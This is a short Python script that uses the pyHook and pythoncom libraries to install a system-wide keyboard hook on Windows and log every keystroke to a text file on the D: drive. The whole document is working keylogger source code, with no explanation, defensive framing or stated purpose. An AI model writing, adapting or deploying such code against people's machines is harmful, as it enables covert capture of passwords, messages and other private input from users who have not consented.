import pyHook, pythoncom, sys, logging
file_log = 'D:\\log.txt'

def OnKeyBoardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hook_manager = pyHook.HookManager()
hook_manager.KeyDown = OnKeyBoardEvent
hook_manager.HookKeyboard()
pythoncom.PumpMessages()

